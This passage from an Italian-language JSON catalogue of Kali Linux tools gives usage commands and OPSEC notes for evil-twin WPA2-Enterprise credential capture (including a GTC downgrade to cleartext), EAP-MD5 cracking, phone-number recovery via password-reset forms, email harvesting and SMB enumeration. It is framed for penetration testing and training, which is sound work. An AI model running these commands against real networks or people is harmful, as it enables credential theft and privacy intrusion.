    "id": "eaphammer",
    "name": "eaphammer",
    "version": "1.14.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eaphammer/",
    "desc": "Attacca reti WPA2-Enterprise con evil twin e cattura credenziali RADIUS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EAPHammer</strong> è un toolkit completo per attacchi a reti wireless <strong>WPA2/WPA3-Enterprise</strong>, sviluppato per semplificare la creazione di access point evil twin con server RADIUS integrato. Le reti enterprise utilizzano autenticazione 802.1X con protocolli EAP (PEAP, EAP-TTLS, EAP-TLS) per validare gli utenti tramite un server RADIUS. EAPHammer sfrutta il fatto che molti client wireless non validano correttamente il certificato del server RADIUS, permettendo a un attaccante di creare un AP clone che cattura le credenziali in transito. Il tool automatizza completamente il processo: generazione certificati, configurazione hostapd, setup del server FreeRADIUS e cattura delle credenziali, riducendo un attacco complesso a un singolo comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin AP Enterprise:</strong> Clona l'SSID della rete enterprise target, creando un access point identico con segnale più forte per attirare i client. I dispositivi che si connettono inviano le credenziali EAP al server RADIUS dell'attaccante anziché a quello legittimo.</p><p><strong>GTC Downgrade Attack:</strong> Forza il client a negoziare <code>EAP-GTC</code> (Generic Token Card) invece di MSCHAPv2. Con GTC le credenziali vengono trasmesse in <strong>chiaro</strong> (non hashate), eliminando la necessità di cracking offline. Questa è la tecnica più efficace quando il client accetta il downgrade.</p><p><strong>Hostile Portal:</strong> Genera un captive portal malevolo che intercetta il traffico HTTP/HTTPS del client connesso, permettendo attacchi di phishing, injection di payload o redirect verso pagine di raccolta credenziali personalizzate.</p><p><strong>Certificate Wizard:</strong> Genera automaticamente certificati X.509 per il server RADIUS con informazioni personalizzabili (CN, Organization). Può creare certificati che imitano quelli dell'organizzazione target per aumentare la credibilità dell'attacco.</p><p><strong>PMKID Attack:</strong> Supporta anche l'attacco PMKID su reti WPA2-PSK, non richiedendo la cattura di un handshake completo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un'interfaccia WiFi che supporta la modalità AP (monitor mode). Eseguire il setup iniziale dei certificati, poi lanciare l'evil twin.</p><pre><code># Setup iniziale: generazione certificati RADIUS\n./eaphammer --cert-wizard\n\n# Evil twin WPA2-Enterprise (cattura hash MSCHAPv2)\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap --creds\n\n# Evil twin con GTC downgrade (credenziali in chiaro)\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap --negotiate eap-gtc\n\n# Hostile portal con captive portal custom\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --hostile-portal\n\n# Karma attack (risponde a qualsiasi SSID richiesto dai client)\n./eaphammer -i wlan0 --channel 6 --auth wpa-eap --creds --karma\n\n# Specificare banda 5GHz\n./eaphammer -i wlan0 --essid CorpWiFi --channel 36 --auth wpa-eap --creds --5ghz</code></pre><p>Le credenziali catturate vengono mostrate in tempo reale nella console e salvate in file di log. Gli hash MSCHAPv2 catturati possono essere crackati con hashcat (mode 5500) o john.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>WiFi Penetration Testing:</strong> Valutare la sicurezza delle reti WPA2-Enterprise dell'organizzazione. Verificare se i client validano correttamente il certificato del server RADIUS e se accettano downgrade EAP-GTC.</p><p><strong>Red Team - Initial Access:</strong> Le credenziali catturate (username/password domain) possono essere usate per autenticarsi alla rete cablata, VPN, email e altri servizi aziendali, fornendo un vettore di initial access senza phishing email.</p><p><strong>Security Awareness:</strong> Dimostrare ai team IT il rischio concreto di reti enterprise con client non configurati correttamente (certificate pinning mancante, profili WiFi non gestiti centralmente).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento WIDS/WIPS:</strong> Soluzioni di Wireless Intrusion Detection (Cisco ISE, Aruba AirWave) rilevano access point evil twin confrontando BSSID, SSID e caratteristiche RF. L'attacco è visibile anche su AirMagnet e Kismet.</p><p><strong>Hardware:</strong> Richiede un'interfaccia WiFi che supporti la modalità AP. Chipset consigliati: Atheros AR9271 (TP-Link TL-WN722N v1), Ralink RT3070. Non tutti gli adattatori supportano la modalità AP.</p><p><strong>Impatto sui client:</strong> L'evil twin può causare disconnessioni dalla rete legittima e generare warning sui dispositivi degli utenti, attirando l'attenzione del team IT.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "eapmd5pass",
    "name": "eapmd5pass",
    "version": "1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eapmd5pass/",
    "desc": "Cracca autenticazione EAP-MD5 catturata da traffico wireless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>eapmd5pass</strong> è uno strumento offline per il cracking di autenticazioni <strong>EAP-MD5</strong> catturate da traffico di rete 802.1X, sia wireless che wired. EAP-MD5 è il metodo di autenticazione EAP più semplice e insicuro: il server invia un challenge casuale, il client risponde con l'hash MD5 della concatenazione di un identificatore, la password dell'utente e il challenge. Poiché non utilizza salt, mutual authentication o tunnel crittografico, un attaccante che cattura lo scambio challenge/response può tentare un attacco dizionario offline per recuperare la password. eapmd5pass automatizza questo processo estraendo i dati necessari direttamente da file PCAP e tentando il cracking con una wordlist.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PCAP Parsing Automatico:</strong> Analizza file di cattura PCAP ed estrae automaticamente le coppie challenge/response EAP-MD5, inclusi l'identificatore EAP e lo username. Supporta capture contenenti multiple sessioni di autenticazione.</p><p><strong>Dictionary Attack Ottimizzato:</strong> Esegue il cracking offline utilizzando una wordlist. Per ogni parola della lista, calcola <code>MD5(identifier + password + challenge)</code> e confronta il risultato con la response catturata. L'algoritmo è ottimizzato per MD5, permettendo velocità di cracking elevate.</p><p><strong>802.1X Wired Support:</strong> Oltre al traffico wireless, supporta autenticazioni EAP-MD5 catturate su reti cablate 802.1X. Questo è rilevante per ambienti dove l'accesso alla rete fisica è controllato tramite NAC (Network Access Control) basato su 802.1X.</p><p><strong>Multi-Session Handling:</strong> Se il file PCAP contiene multiple sessioni di autenticazione EAP-MD5 (diversi utenti o tentativi ripetuti), eapmd5pass le analizza tutte, permettendo di specificare uno username target o crackare tutte le sessioni trovate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Catturare il traffico 802.1X con tcpdump o Wireshark, poi lanciare eapmd5pass sul file PCAP.</p><pre><code># Cattura traffico 802.1X (prerequisito)\ntcpdump -i eth0 -w capture.pcap 'ether proto 0x888e'\n\n# Cracking base con wordlist\neapmd5pass -r capture.pcap -w /usr/share/wordlists/rockyou.txt\n\n# Specificare lo username target\neapmd5pass -r capture.pcap -w wordlist.txt -u admin\n\n# Output verboso con dettagli challenge/response\neapmd5pass -r capture.pcap -w wordlist.txt -v\n\n# Specificare challenge e response manualmente\neapmd5pass -c <challenge_hex> -R <response_hex> -i <id> -w wordlist.txt</code></pre><p>Se la password è presente nella wordlist, viene mostrata insieme allo username corrispondente. La velocità di cracking dipende dalla dimensione della wordlist e dalla potenza CPU.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Wireless/Wired Pentesting:</strong> Quando si intercetta traffico di autenticazione 802.1X su una rete che utilizza EAP-MD5, eapmd5pass permette di recuperare le credenziali offline. Questo è particolarmente rilevante su reti legacy non ancora migrate a protocolli più sicuri.</p><p><strong>Security Assessment:</strong> Dimostrare concretamente la debolezza di EAP-MD5 rispetto a PEAP o EAP-TLS durante un audit di sicurezza, giustificando la migrazione a protocolli con mutual authentication e tunnel TLS.</p><p><strong>Forensics:</strong> Analizzare catture di rete storiche per determinare se credenziali EAP-MD5 sono state esposte durante un incidente di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Protocollo Deprecato:</strong> EAP-MD5 è ufficialmente deprecato e raramente utilizzato in ambienti moderni. La maggior parte delle reti enterprise usa PEAP-MSCHAPv2 o EAP-TLS. Lo strumento è quindi utile principalmente per reti legacy, ambienti industriali o sistemi embedded con stack 802.1X datati.</p><p><strong>Prerequisiti:</strong> Richiede una cattura del traffico 802.1X contenente lo scambio EAP-MD5. Su reti wireless, è necessario catturare i frame di autenticazione prima dell'associazione. Su reti cablate, richiede accesso fisico allo stesso segmento di rete (port mirroring o tap).</p><p><strong>Cracking Offline:</strong> Tutto il processo avviene offline sulla macchina dell'attaccante, senza generare traffico verso il target. Non è rilevabile dalla rete dopo la fase di cattura.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "edb-debugger",
    "name": "edb-debugger",
    "version": "1.3.0",
    "icon": "../app/icons/edb-debugger-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/edb-debugger/",
    "desc": "Debugger cross-platform simile a OllyDbg per analisi binaria su Linux.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EDB (Evan's Debugger)</strong> è un debugger binario con interfaccia grafica Qt per Linux, ispirato al celebre <strong>OllyDbg</strong> di Windows. Offre un'esperienza di debugging visuale per binari x86 e x86_64, combinando disassembly, visualizzazione della memoria, registri e stack in un'interfaccia integrata. A differenza di GDB (che è command-line), EDB permette di navigare il codice assembly visivamente, impostare breakpoint con un click e ispezionare la memoria in tempo reale. È particolarmente apprezzato da chi proviene dal mondo Windows e cerca un'esperienza simile a OllyDbg/x64dbg su Linux, senza la curva di apprendimento di GDB o la pesantezza di IDA Pro/Ghidra.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual Debugging:</strong> Interfaccia divisa in pannelli sincronizzati: disassembly (con grafo del flusso), registri CPU (con modifica in tempo reale), stack view, memory dump hex/ASCII. Tutto è aggiornato in tempo reale durante il stepping.</p><p><strong>Breakpoint Avanzati:</strong> Supporta breakpoint software (INT3), hardware (tramite registri DR0-DR3) e condizionali (si attivano solo quando un'espressione è vera). I breakpoint hardware sono essenziali per monitorare accessi in lettura/scrittura a specifiche locazioni di memoria.</p><p><strong>Memory Analysis:</strong> Viewer esadecimale completo con ricerca di pattern, stringhe, valori numerici e riferimenti a indirizzi. Supporta la ricerca di sequenze di byte (opcode) nella memoria del processo per trovare gadget ROP o shellcode.</p><p><strong>Plugin System:</strong> Architettura a plugin estensibile in C++. Include plugin integrati per: analisi degli opcode (OpcodeSearcher), ricerca di stringhe (ROPTool), analisi delle regioni di memoria (MemoryRegions), e checksumming di segmenti di codice.</p><p><strong>Supporto Multi-Architettura:</strong> Debug nativo di binari ELF x86 (32-bit) e x86_64 (64-bit). Visualizza istruzioni assembly Intel e AT&T syntax.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare EDB dalla GUI o da terminale, poi caricare il binario da analizzare.</p><pre><code># Avviare l'interfaccia grafica\nedb\n\n# Caricare e avviare un binario direttamente\nedb --run /path/to/binary\n\n# Caricare un binario con argomenti\nedb --run ./vulnerable_app --input payload.bin\n\n# Attach a un processo in esecuzione tramite PID\nedb --attach 1234\n\n# Workflow tipico (dalla GUI)\n# 1. File → Open → selezionare il binario ELF\n# 2. Click sulla riga di assembly per impostare breakpoint\n# 3. F9 per Run, F8 per Step Over, F7 per Step Into\n# 4. Plugins → OpcodeSearcher per cercare gadget</code></pre><p>Durante il debugging, i registri modificati sono evidenziati in rosso. Il pannello stack mostra i frame di chiamata e i parametri delle funzioni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Exploit Development:</strong> Sviluppo e test di exploit per vulnerabilità come buffer overflow, format string e use-after-free. La visualizzazione in tempo reale di stack e registri semplifica il debugging del payload e la verifica del controllo dell'instruction pointer (EIP/RIP).</p><p><strong>Reverse Engineering:</strong> Analisi di binari Linux stripped (senza simboli di debug) per comprenderne la logica. Utile per CTF reverse engineering challenges dove il codice sorgente non è disponibile.</p><p><strong>Malware Analysis:</strong> Debug dinamico di sample malware Linux in ambiente sandbox. Permette di osservare il comportamento del malware passo-passo, identificando chiamate di sistema, connessioni di rete e manipolazioni del file system.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Tool di analisi locale:</strong> EDB è uno strumento di analisi che gira sulla macchina dell'analista. Non genera traffico di rete né lascia tracce sul sistema target. È utilizzato nella fase di preparazione dell'exploit, non durante l'engagement attivo.</p><p><strong>Anti-debug:</strong> Malware sofisticati possono rilevare la presenza di un debugger tramite <code>ptrace(PTRACE_TRACEME)</code>, timing checks o lettura di <code>/proc/self/status</code>. In questi casi, è necessario bypassare le protezioni anti-debug prima dell'analisi.</p><p><strong>Performance:</strong> Su binari molto grandi o con protezioni avanzate (packing, obfuscation), EDB può risultare lento. Per analisi complesse, combinare con Ghidra per l'analisi statica e usare EDB solo per la verifica dinamica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "email2phonenumber",
    "name": "email2phonenumber",
    "version": "0~git20220216",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/email2phonenumber/",
    "desc": "Cerca numero di telefono associato a un'email tramite form di recovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>email2phonenumber</strong> è uno strumento OSINT che tenta di scoprire il numero di telefono associato a un indirizzo email sfruttando le funzionalità di <strong>password recovery</strong> dei principali servizi online. Quando un utente richiede il reset della password su servizi come Google, Microsoft, Apple o Twitter, la piattaforma mostra un frammento mascherato del numero di telefono associato (es. <code>***-***-**42</code> o <code>+39 *** *** *8 56</code>). Ogni servizio maschera cifre diverse. email2phonenumber automatizza questo processo su più piattaforme simultaneamente e combina i frammenti parziali ottenuti per ricostruire il numero completo o quasi completo, una tecnica nota come <strong>cross-service phone number recovery</strong>.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Service Probing:</strong> Testa i form di password recovery di servizi multipli: Google, Microsoft (Outlook/Hotmail), Apple, Twitter/X, LinkedIn, Instagram, Yahoo e altri. Ogni servizio rivela cifre diverse del numero, permettendo di comporre il puzzle.</p><p><strong>Fragment Assembly:</strong> Algoritmo di ricostruzione che combina automaticamente i frammenti parziali ottenuti da servizi diversi. Se Google mostra le ultime 2 cifre e Microsoft le ultime 4, il tool combina le informazioni per ricostruire una porzione maggiore del numero.</p><p><strong>Country Code Detection:</strong> Identifica il prefisso internazionale del numero di telefono dai frammenti disponibili, restringendo il range di possibili numeri e il paese di residenza del target.</p><p><strong>Brute Force Mode:</strong> Se mancano poche cifre dopo l'assemblaggio, può tentare un brute force inviando codici di verifica ai numeri candidati per identificare quello corretto (richiede cautela).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Installare le dipendenze (Selenium e ChromeDriver sono necessari per navigare i form di recovery) e lanciare lo script.</p><pre><code># Installazione dipendenze\npip3 install -r requirements.txt\n\n# Cercare il numero di telefono per un'email\npython3 email2phonenumber.py scrape -e target@gmail.com\n\n# Specificare servizi particolari\npython3 email2phonenumber.py scrape -e target@email.com -s google,microsoft,apple\n\n# Modalità verbose per vedere i frammenti trovati\npython3 email2phonenumber.py scrape -e target@email.com -v\n\n# Assemblare frammenti da file\npython3 email2phonenumber.py parse -f fragments.txt\n\n# Bruteforce delle cifre mancanti (con cautela)\npython3 email2phonenumber.py bruteforce -p +39347XXX1234 -e target@gmail.com</code></pre><p>L'output mostra i frammenti trovati per ogni servizio e il numero ricostruito con le cifre mancanti indicate con <code>X</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>OSINT Investigation:</strong> Correlare un indirizzo email a un numero di telefono durante un'indagine. Il numero può poi essere usato per ulteriori ricerche OSINT (lookup inverso, social media, geolocalizzazione).</p><p><strong>Social Engineering Recon:</strong> Raccogliere informazioni sul target per costruire un pretesto credibile. Conoscere il numero di telefono permette attacchi di vishing (voice phishing) o smishing (SMS phishing).</p><p><strong>Red Team Reconnaissance:</strong> Mappare il profilo digitale di dipendenti target per identificare vettori di attacco aggiuntivi durante la fase di information gathering.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting e Alert:</strong> I servizi moderni limitano i tentativi di recovery e possono notificare l'utente target che qualcuno ha richiesto il reset della password. Google in particolare invia notifiche push al dispositivo dell'utente. Questo può allertare il target.</p><p><strong>CAPTCHA e 2FA:</strong> Molti servizi richiedono la risoluzione di CAPTCHA durante il processo di recovery, rendendo l'automazione più complessa. L'efficacia del tool è diminuita nel tempo con l'implementazione di protezioni più robuste.</p><p><strong>Legalità:</strong> L'uso di form di password recovery per raccogliere informazioni su terzi può violare i ToS dei servizi e, in alcune giurisdizioni, le normative sulla privacy. Utilizzare solo in contesti autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "emailharvester",
    "name": "emailharvester",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/emailharvester/",
    "desc": "Raccoglie indirizzi email da motori di ricerca per un dominio target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EmailHarvester</strong> è uno strumento Python per la raccolta automatizzata di indirizzi email associati a un dominio target tramite motori di ricerca. Utilizza query <code>dork</code> (es. <code>@target.com</code>) su molteplici motori di ricerca contemporaneamente per aggregare il maggior numero possibile di indirizzi email pubblicamente visibili. A differenza di TheHarvester (che include anche DNS, sottodomini e altre funzionalità), EmailHarvester è focalizzato esclusivamente sulla raccolta di email, risultando più semplice e diretto per questo specifico compito. Supporta Google, Bing, Yahoo, Baidu, ASK, Dogpile e altri motori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Engine Search:</strong> Interroga simultaneamente Google, Bing, Yahoo, Baidu, ASK, Dogpile, Exalead e altri motori di ricerca. Ogni motore può restituire risultati diversi, quindi la combinazione massimizza la copertura. Usa query come <code>\"@target.com\"</code> per trovare pagine che menzionano email del dominio.</p><p><strong>Automatic Deduplication:</strong> Gli stessi indirizzi email possono apparire su più motori. EmailHarvester deduplica automaticamente i risultati, fornendo una lista pulita di indirizzi unici.</p><p><strong>Pagination Handling:</strong> Naviga automaticamente attraverso le pagine dei risultati di ricerca per raccogliere il massimo numero di email, rispettando i limiti configurati dall'utente.</p><p><strong>Export Flessibile:</strong> Salva i risultati in file di testo, uno per riga, pronti per essere usati come input per altri tool (GoPhish, King Phisher, Responder).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script specificando il dominio target e opzionalmente il motore di ricerca preferito.</p><pre><code># Raccolta email su tutti i motori disponibili\nEmailHarvester -d target.com\n\n# Usare solo Google come motore\nEmailHarvester -d target.com -e google\n\n# Usare Bing (meno rate limiting di Google)\nEmailHarvester -d target.com -e bing\n\n# Salvare i risultati su file\nEmailHarvester -d target.com -o emails_target.txt\n\n# Limitare il numero di pagine di risultati\nEmailHarvester -d target.com -l 200\n\n# Combinazione completa\nEmailHarvester -d target.com -e all -l 500 -o target_emails.txt</code></pre><p>L'output mostra gli indirizzi email trovati, organizzati per motore di ricerca, con il totale di indirizzi unici al termine.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Reconnaissance Pre-Engagement:</strong> Costruire una lista di indirizzi email dei dipendenti di un'organizzazione target come primo step nella catena di attacco. Le email trovate rivelano il formato naming convention (nome.cognome@, n.cognome@, etc.).</p><p><strong>Phishing Assessment:</strong> Identificare i destinatari per campagne di phishing simulato durante test di security awareness. Le email trovate pubblicamente sono quelle più esposte a phishing reale.</p><p><strong>OSINT:</strong> Mappare il personale di un'organizzazione. Le email associate a conferenze, paper, profili LinkedIn e forum rivelano ruoli e responsabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Google è particolarmente aggressivo con il rate limiting e può bloccare le richieste con CAPTCHA. Bing e Yahoo sono generalmente più permissivi. Usare delay tra le richieste per ridurre il rischio di blocco.</p><p><strong>Alternative più complete:</strong> TheHarvester è più completo e include anche DNS enumeration, sottodomini e integrazione con API (Shodan, Hunter.io). Per engagement professionali, considerare Hunter.io o Apollo.io che offrono database pre-indicizzati con API.</p><p><strong>Risultati parziali:</strong> I motori di ricerca indicizzano solo una frazione delle email disponibili. Combinare con LinkedIn OSINT, data breach databases e Google Dorks specifici per una copertura più completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "enum4linux-ng",
    "name": "enum4linux-ng",
    "version": "1.3.5",
    "icon": "../app/icons/enum4linux-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enum4linux-ng/",
    "desc": "Enumerazione SMB/NetBIOS moderna: user, share, policy, RID cycling.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>enum4linux-ng</strong> è la riscrittura moderna in Python del classico enum4linux (Perl). Enumera informazioni da sistemi <strong>Windows e Samba</strong> tramite protocolli SMB e RPC, estraendo utenti, gruppi, share di rete, policy password, SID del dominio, informazioni sul sistema operativo e molto altro. Rispetto al predecessore, offre output strutturato (JSON, YAML), gestione errori migliorata, supporto per SMBv2/v3 e compatibilità con ambienti Active Directory moderni. È il primo strumento da lanciare quando si trova un servizio SMB (porta 445) aperto durante un penetration test, poiché fornisce una visione completa dell'ambiente target in pochi secondi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Enumera utenti del dominio tramite due tecniche: <code>querydispinfo</code> (interroga il SAM database) e <code>RID cycling</code> (enumera SID incrementando il RID da 500 in avanti). RID cycling è particolarmente utile quando querydispinfo è bloccato ma le RPC calls sono permesse.</p><p><strong>Share Enumeration:</strong> Elenca tutte le share SMB disponibili e testa automaticamente i permessi di accesso (read/write) per ciascuna, sia con null session che con credenziali. Identifica share con permessi eccessivi che potrebbero contenere dati sensibili.</p><p><strong>Password Policy:</strong> Recupera la policy password del dominio: lunghezza minima, complessità, history, durata massima e, fondamentale, la <strong>soglia di lockout</strong>. Conoscere la lockout threshold è essenziale prima di eseguire password spraying per evitare di bloccare account.</p><p><strong>Group & Membership:</strong> Enumera gruppi locali e di dominio con i rispettivi membri. Identifica rapidamente utenti in gruppi privilegiati (Domain Admins, Enterprise Admins, Administrators).</p><p><strong>OS Information:</strong> Rileva versione del sistema operativo, nome NetBIOS, dominio, forest e livello funzionale del dominio. Utile per identificare sistemi legacy vulnerabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare contro un Domain Controller o un server Windows/Samba con porta 445 aperta.</p><pre><code># Enumerazione completa automatica\nenum4linux-ng -A 10.10.10.1\n\n# Con credenziali di dominio\nenum4linux-ng -u 'domain\\user' -p 'password' 10.10.10.1\n\n# Solo utenti e gruppi\nenum4linux-ng -U -G 10.10.10.1\n\n# Enumerazione share con test permessi\nenum4linux-ng -S 10.10.10.1\n\n# Output JSON per parsing automatico\nenum4linux-ng -A -oJ enum_results 10.10.10.1\n\n# RID cycling con range personalizzato\nenum4linux-ng -R 500-2000 10.10.10.1\n\n# Null session esplicita\nenum4linux-ng -A -u '' -p '' 10.10.10.1</code></pre><p>L'output colorato evidenzia le informazioni critiche. Il formato JSON è ideale per feeding in altri tool o script di automazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Active Directory Enumeration:</strong> Primo step dopo aver identificato un Domain Controller. Fornisce la lista utenti per password spraying, le share per la ricerca di file sensibili, e la password policy per calibrare gli attacchi.</p><p><strong>Internal Penetration Test:</strong> Identificare share SMB con permessi eccessivi (Everyone: Full Control) che contengono script con credenziali, backup di database o file di configurazione sensibili.</p><p><strong>CTF e Lab:</strong> Strumento standard per challenge Windows/AD su HackTheBox, TryHackMe e OSCP. Spesso il primo comando lanciato dopo nmap quando si trova la porta 445 aperta.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione SMB genera eventi Windows Security (Event ID 4624, 4625, 4634). Le null session e il RID cycling sono attività anomale facilmente rilevabili da SIEM e EDR. In ambienti monitorati, preferire query LDAP più discrete.</p><p><strong>Null Session:</strong> Le null session sono bloccate di default su Windows Server 2016+ e Windows 10+. In ambienti moderni, è quasi sempre necessario disporre di credenziali valide (anche a basso privilegio) per ottenere risultati significativi.</p><p><strong>Account Lockout:</strong> Il RID cycling non causa lockout (non tenta autenticazioni), ma successive operazioni come password spraying sì. Verificare sempre la lockout policy prima di procedere.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "enum4linux",
    "name": "enum4linux",
    "version": "0.9.1",
    "icon": "../app/icons/enum4linux-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enum4linux/",
    "desc": "Tool classico per enumerazione Windows/Samba via SMB e RPC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>enum4linux</strong> è lo script Perl classico per l'enumerazione di sistemi Windows e Samba tramite protocolli SMB e RPC. Funziona come wrapper intelligente attorno ai tool Linux <code>smbclient</code>, <code>rpcclient</code>, <code>net</code> e <code>nmblookup</code>, automatizzando la raccolta di informazioni che altrimenti richiederebbero molteplici comandi manuali. Sviluppato originariamente da Mark Lowe, è stato per anni lo standard de facto per l'enumerazione SMB durante i penetration test. Sebbene sia ancora perfettamente funzionale, per ambienti moderni si consiglia <code>enum4linux-ng</code> che offre output strutturato (JSON/YAML) e migliore compatibilità con SMBv2/v3.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration (RID Cycling):</strong> Enumera utenti del dominio incrementando il Relative Identifier (RID) a partire da valori noti (500 = Administrator, 501 = Guest, 1000+ = utenti normali). Questa tecnica bypassa le restrizioni ACL che bloccano la query diretta della lista utenti.</p><p><strong>Share Enumeration:</strong> Elenca tutte le share SMB disponibili e tenta l'accesso a ciascuna per verificare i permessi. Identifica share anonimamente accessibili o con permessi eccessivi.</p><p><strong>Password Policy:</strong> Recupera la policy password del dominio, inclusa la soglia di lockout degli account. Informazione critica prima di qualsiasi tentativo di password spraying.</p><p><strong>Workgroup/Domain Info:</strong> Identifica il nome del dominio/workgroup, i Domain Controller, il nome NetBIOS del sistema e la versione del sistema operativo tramite query SMB e NetBIOS.</p><p><strong>Group Enumeration:</strong> Elenca gruppi locali e di dominio con i rispettivi membri, identificando utenti privilegiati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare contro un host con porta 445 (SMB) aperta.</p><pre><code># Enumerazione completa (tutte le informazioni)\nenum4linux -a 10.10.10.1\n\n# RID cycling per trovare utenti via null session\nenum4linux -r -u '' -p '' 10.10.10.1\n\n# RID cycling con range personalizzato\nenum4linux -r -R 500-550,1000-1200 -u guest -p '' 10.10.10.1\n\n# Enumerazione share con test permessi\nenum4linux -S 10.10.10.1\n\n# Recupero password policy\nenum4linux -P 10.10.10.1\n\n# Con credenziali valide\nenum4linux -a -u 'user' -p 'password' 10.10.10.1\n\n# Output su file per analisi successiva\nenum4linux -a 10.10.10.1 2&gt;/dev/null | tee enum_results.txt\n\n# Pipeline: estrai utenti e passa a crackmapexec\nenum4linux -U 10.10.10.1 | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 &gt; users.txt</code></pre><p>L'output è in formato testo con sezioni separate per ogni tipo di informazione. Per output strutturato, usare <code>enum4linux-ng</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy System Enumeration:</strong> Eccelle su sistemi Windows Server 2003/2008 e vecchie versioni di Samba dove le null session sono ancora abilitate. In questi ambienti, fornisce una quantità impressionante di informazioni senza credenziali.</p><p><strong>Quick Initial Recon:</strong> Quando si trova la porta 445 aperta durante un pentest, <code>enum4linux -a</code> è spesso il primo comando lanciato per ottenere una visione d'insieme rapida del target.</p><p><strong>CTF e Certificazioni:</strong> Tool standard per challenge OSCP, HTB e THM. La familiarità con il suo output è considerata fondamentale per le certificazioni offensive.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione SMB genera eventi nel Security Event Log di Windows (Event ID 4624/4625 per logon, 5140/5145 per accesso share). Le null session e il RID cycling sono attività anomale facilmente rilevabili.</p><p><strong>Limitazioni moderne:</strong> Le null session sono bloccate di default su Windows 10+ e Server 2016+. Su sistemi moderni, è quasi sempre necessario disporre di credenziali valide. Per ambienti AD moderni, <code>enum4linux-ng</code> è preferibile per la migliore compatibilità SMBv2/v3.</p><p><strong>Output non strutturato:</strong> L'output in testo libero è difficile da parsare automaticamente. Per integrazione con pipeline di automazione, usare <code>enum4linux-ng</code> con output JSON.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "enumiax",
    "name": "enumiax",
    "version": "0.4a",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enumiax/",
    "desc": "Enumera username IAX2 su PBX Asterisk tramite brute force.",
